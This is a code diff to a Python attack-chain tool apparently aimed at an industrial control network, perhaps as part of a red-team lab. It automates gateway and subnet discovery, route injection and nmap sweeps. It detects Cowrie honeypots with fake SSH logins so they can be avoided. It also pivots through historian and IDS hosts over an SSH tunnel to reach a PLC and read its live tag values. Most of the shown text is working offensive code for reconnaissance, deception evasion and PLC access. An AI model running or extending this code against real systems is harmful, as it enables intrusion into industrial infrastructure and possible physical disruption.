@@ -419,7 +419,14 @@ def auto_route(subnets: list[str]):
     info(f"Gateway candidates: {candidates}")
 
     for subnet in subnets:
-        probe_ip, probe_port = SUBNET_PROBE.get(subnet, (subnet.split("/")[0], 22))
+        if subnet in SUBNET_PROBE:
+            probe_ip, probe_port = SUBNET_PROBE[subnet]
+        else:
+            # Unknown subnet — probe its .1 gateway address on port 22 then 80
+            prefix       = ".".join(subnet.split("/")[0].split(".")[:3])
+            probe_ip     = f"{prefix}.1"
+            probe_port   = 22
+            info(f"Unknown subnet {subnet} — defaulting probe to {probe_ip}:{probe_port}")
         info(f"Hunting route to {subnet}  (TCP-probe {probe_ip}:{probe_port})")
 
         routed = False
@@ -697,55 +704,117 @@ def _parse_nmap_hosts(nmap_output: str) -> dict[str, list[str]]:
     return {ip: ports for ip, ports in hosts.items() if ports}
 
 
+def _detect_cowrie(ip: str, port: int = 22) -> bool:
+    """
+    Active Cowrie honeypot fingerprinter.
+
+    A real SSH server raises AuthenticationException for garbage credentials.
+    Cowrie (and other deception systems) accept any login to trap the attacker.
+
+    Returns True  → honeypot (accepted our fake creds — DO NOT trust this host).
+    Returns False → real server (rejected creds, timed-out, or refused connection).
+    """
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(
+            hostname=ip, port=port,
+            username="fake_hunter99",
+            password="FakePassw0rd!@#88",
+            timeout=3,
+            banner_timeout=3,
+            allow_agent=False,
+            look_for_keys=False,
+        )
+        # If we reach here the server accepted garbage creds — it's a honeypot
+        client.close()
+        return True
+    except paramiko.AuthenticationException:
+        return False   # real server — correctly rejected us
+    except Exception:
+        return False   # timeout, refused, etc. — treat as real/unknown
+
+
 def phase2_idmz_recon() -> PhaseResult:
-    phase_header(2, "IDMZ Recon (nmap)")
+    phase_header(2, "IDMZ Recon (autonomous)")
     r = PhaseResult("IDMZ Recon")
 
-    # Routing injected here — we are now associated with the target WiFi.
-    info("Injecting routes to IDMZ / OT subnets (post-WiFi association)...")
-    auto_route([
-        CFG["nmap"]["idmz_subnet"],
-        "10.20.20.0/24",
-    ])
+    ports = CFG["nmap"]["ports"]
 
-    subnet = CFG["nmap"]["idmz_subnet"]
-    ports  = CFG["nmap"]["ports"]
+    # ── Step 1: discover gateway and reachable subnets dynamically ────────────
+    info("Discovering Wi-Fi gateway...")
+    gateway = _find_gateway()
+    if not gateway:
+        r.status  = "failed"
+        r.finding = "No default gateway found — is wlan0 associated?"
+        err(r.finding)
+        return r
+    ok(f"Gateway: {gateway}")
 
-    # Sweep the full IDMZ subnet with --open so only genuinely reachable hosts
-    # are returned — avoids the false-positive from a hardcoded IP string match.
-    nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
-    info(f"Sweeping {subnet}  ports {ports}")
-    rc, out = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
+    info("Probing gateway for reachable subnets...")
+    discovered_subnets = _probe_gateway_for_subnets(gateway)
+    if not discovered_subnets:
+        warn("Subnet probe returned nothing — falling back to CFG idmz_subnet")
+        discovered_subnets = [CFG["nmap"]["idmz_subnet"]]
+    else:
+        ok(f"Discovered subnets: {', '.join(discovered_subnets)}")
 
-    live_hosts = _parse_nmap_hosts(out)
+    # ── Step 2: inject routes for every discovered subnet ─────────────────────
+    info("Injecting routes for all discovered subnets...")
+    auto_route(discovered_subnets)
 
-    # Warn on honeypot if it appeared
-    honeypot_ip = CFG["honeypot"]["ip"]
-    if honeypot_ip in live_hosts:
-        warn(f"[TRAP] Cowrie honeypot detected at {honeypot_ip} — excluded from selection")
-        del live_hosts[honeypot_ip]
+    # ── Step 3: nmap sweep across all discovered subnets ─────────────────────
+    all_nmap_out = ""
+    live_hosts: dict[str, list[str]] = {}
+
+    for subnet in discovered_subnets:
+        nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
+        info(f"Sweeping {subnet}  ports {ports}")
+        rc, out  = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
+        all_nmap_out += out
+        hosts = _parse_nmap_hosts(out)
+        live_hosts.update(hosts)
 
     if not live_hosts:
         r.status  = "failed"
-        r.finding = "No hosts with open ports found in IDMZ — check routing / FortiGate"
+        r.finding = "No hosts with open ports found across discovered subnets"
         err(r.finding)
-        r.output  = out[-2000:]
+        r.output  = all_nmap_out[-2000:]
         return r
 
-    # ── Display discovered hosts ──────────────────────────────────────────────
+    # ── Step 4: active Cowrie fingerprinting on every SSH-speaking host ───────
+    info("Fingerprinting SSH hosts for Cowrie honeypot signatures...")
+    cowrie_flags: dict[str, bool] = {}
+    for ip, open_ports in live_hosts.items():
+        if "22" in open_ports:
+            info(f"  Testing {ip}:22 with fake credentials...")
+            is_trap = _detect_cowrie(ip, port=22)
+            cowrie_flags[ip] = is_trap
+            if is_trap:
+                warn(f"  [TRAP] {ip} accepted garbage creds — Cowrie honeypot confirmed!")
+            else:
+                ok(f"  {ip} rejected fake creds — real SSH server")
+
+    # ── Step 5: display results (honeypots flagged, not hidden) ───────────────
     host_table = Table(
-        title="[bold magenta]IDMZ Live Hosts[/bold magenta]",
+        title="[bold magenta]Discovered Live Hosts[/bold magenta]",
         show_header=True, header_style="bold cyan", border_style="dim",
     )
     host_table.add_column("#",          style="dim",    width=4)
     host_table.add_column("IP Address", style="green",  width=18)
-    host_table.add_column("Open Ports", style="yellow", width=40)
+    host_table.add_column("Open Ports", style="yellow", width=52)
+
     host_list = list(live_hosts.items())
     for i, (ip, open_ports) in enumerate(host_list, 1):
-        host_table.add_row(str(i), ip, ", ".join(open_ports))
+        ports_str = ", ".join(open_ports)
+        if cowrie_flags.get(ip):
+            ports_str += "  [bold red]\[TRAP: Cowrie Honeypot][/bold red]"
+        host_table.add_row(str(i), ip, ports_str)
+
     console.print(host_table)
     console.print(
-        "[dim]  Select the Historian (SSH port 22 should be open).  "
+        "[dim]  Honeypots are visible but flagged — "
+        "select the real Historian (port 22, not a trap).  "
         "[bold]q[/bold] = abort[/dim]"
     )
     console.print()
@@ -763,13 +832,20 @@ def phase2_idmz_recon() -> PhaseResult:
         err(r.finding)
         return r
 
-    # Persist selection so all later phases target the right machine
+    if cowrie_flags.get(chosen_ip):
+        warn(f"WARNING: {chosen_ip} is a confirmed Cowrie honeypot — selection noted")
+
     CFG["historian"]["ip"] = chosen_ip
     ok(f"Historian set to [bold]{chosen_ip}[/bold]  (open ports: {', '.join(chosen_ports)})")
 
+    trap_count = sum(1 for v in cowrie_flags.values() if v)
     r.status  = "success"
-    r.finding = f"Historian confirmed at {chosen_ip}  ports: {', '.join(chosen_ports)}"
-    r.output  = out[-2000:]
+    r.finding = (
+        f"Historian: {chosen_ip}  |  "
+        f"{len(live_hosts)} hosts found across {len(discovered_subnets)} subnets  |  "
+        f"{trap_count} honeypot(s) flagged"
+    )
+    r.output  = all_nmap_out[-2000:]
     return r
 
 
@@ -1669,8 +1745,20 @@ def phase5_cip_enum() -> PhaseResult:
 
     from pycomm3 import LogixDriver
 
-    CIP_SLOTS     = ["", "/0", "/1", "/2", "/3"]
-    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
+    # ── Pull credentials from CFG (same pattern as phase5_plc_attack) ─────────
+    plc_ip    = CFG["plc"]["ip"]
+
+    hist_ip   = CFG["historian"]["ip"]
+    hist_user = CFG["historian"]["username"]
+    hist_pass = CFG["historian"]["password"]
+
+    ids_ip    = CFG["ids"]["ip"]
+    ids_user  = CFG["ids"]["username"]
+    ids_pass  = CFG["ids"]["password"]
+    ids_pkey  = CFG["ids"].get("private_key")
+
+    LOCAL_PORT   = 44818
+    CIP_SLOTS    = ["", "/0", "/1", "/2", "/3"]
 
     def _tname(t) -> str:
         return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
@@ -1685,32 +1773,52 @@ def phase5_cip_enum() -> PhaseResult:
             or "Trend:"   in name
         )
 
-    warn("Assumes ssh -L 44818:<PLC_IP>:44818 tunnel is already live on port 44818")
-
-    plc_conn = None
-    working_path = None
-    for slot in CIP_SLOTS:
-        path = f"127.0.0.1{slot}"
-        info(f"Trying CIP path: {path!r}")
-        drv = LogixDriver(path, init_info=False)
-        try:
-            drv.open()
-            plc_conn     = drv
-            working_path = path
-            ok(f"PLC connected at {path!r}")
-            break
-        except Exception as slot_err:
-            warn(f"  {path!r} → {slot_err}")
-            try: drv.close()
-            except Exception: pass
-
-    if plc_conn is None:
-        r.status  = "failed"
-        r.finding = "All CIP slot paths failed — verify tunnel is live on port 44818"
-        err(r.finding)
-        return r
+    tunnel_proc: "subprocess.Popen | None" = None
+    key_file:    "str | None"              = None
+    plc_conn                               = None
 
     try:
+        # ── Spawn ssh -L tunnel ───────────────────────────────────────────────
+        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
+        tunnel_proc, key_file = _open_cip_tunnel(
+            hist_ip, hist_user, hist_pass,
+            ids_ip,  ids_user,  ids_pass, ids_pkey,
+            plc_ip,  LOCAL_PORT,
+        )
+
+        info("Waiting 4 s for tunnel to stabilise...")
+        time.sleep(4)
+
+        if tunnel_proc.poll() is not None:
+            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
+            raise RuntimeError(
+                f"SSH tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
+            )
+        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")
+
+        # ── Slot hunt ─────────────────────────────────────────────────────────
+        working_path = None
+        for slot in CIP_SLOTS:
+            path = f"127.0.0.1{slot}"
+            info(f"Trying CIP path: {path!r}")
+            drv = LogixDriver(path, init_info=False)
+            try:
+                drv.open()
+                plc_conn     = drv
+                working_path = path
+                ok(f"PLC connected at {path!r}")
+                break
+            except Exception as slot_err:
+                warn(f"  {path!r} → {slot_err}")
+                try: drv.close()
+                except Exception: pass
+
+        if plc_conn is None:
+            raise RuntimeError(
+                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel"
+            )
+
+        # ── Tag enumeration ───────────────────────────────────────────────────
         info("Pulling full tag list from PLC data table...")
         all_tags  = plc_conn.get_tag_list()
         user_tags = [t for t in all_tags if not _is_noise(_tname(t))]
@@ -1727,6 +1835,7 @@ def phase5_cip_enum() -> PhaseResult:
             err(r.finding)
             return r
 
+        # ── Live reads ────────────────────────────────────────────────────────
         info("Reading live values from PLC...")
         tbl = Table(
             title="[bold magenta]Target Environment: PLC Memory Map[/bold magenta]",
@@ -1782,8 +1891,15 @@ def phase5_cip_enum() -> PhaseResult:
         r.finding = str(e)
         err(str(e))
     finally:
-        try: plc_conn.close()
-        except Exception: pass
+        if plc_conn:
+            try: plc_conn.close()
+            except Exception: pass
+        if tunnel_proc and tunnel_proc.poll() is None:
+            tunnel_proc.terminate()
+            info("SSH tunnel closed")
+        if key_file and os.path.exists(key_file):
+            os.remove(key_file)
+            info(f"Removed {key_file}")
 
     return r
 
